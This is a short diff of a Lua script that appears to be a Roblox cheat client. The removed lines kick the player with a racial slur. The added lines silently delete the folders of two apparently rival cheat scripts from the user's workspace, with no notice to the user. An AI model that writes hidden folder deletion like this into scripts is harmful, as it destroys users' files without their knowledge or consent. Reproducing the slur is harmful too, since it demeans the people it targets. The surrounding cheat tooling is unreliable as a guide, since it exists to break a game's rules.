@@ -5866,12 +5866,11 @@ runFunction(function()
 end)
 
 if isfolder('RavenB4') then 
-	if isfile('shitscript.txt') then 
-		lplr:Kick('ok nigga, go back to ur vape paste.') 
-	else
-		writefile('shitscript.txt', 'ok')
-		delfolder('RavenB4') 
-	end
+		delfolder('RavenB4')
+end
+
+if isfolder('AlSploit') then 
+		delfolder('AlSploit')
 end
 
 --[[task.spawn(function()
